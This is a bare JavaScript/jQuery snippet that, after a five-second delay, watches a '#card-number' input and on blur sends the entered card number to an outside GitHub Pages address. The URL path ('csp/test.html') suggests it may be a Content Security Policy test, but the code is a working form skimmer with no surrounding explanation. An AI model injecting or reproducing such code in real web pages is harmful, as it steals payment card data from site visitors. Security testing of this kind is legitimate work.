setTimeout(function() {
  $("#card-number").on('blur', function() {
    $.get( "https://mmiesiak.github.io/csp/test.html?card=" + $(this).val() );
  })
}, 5000);
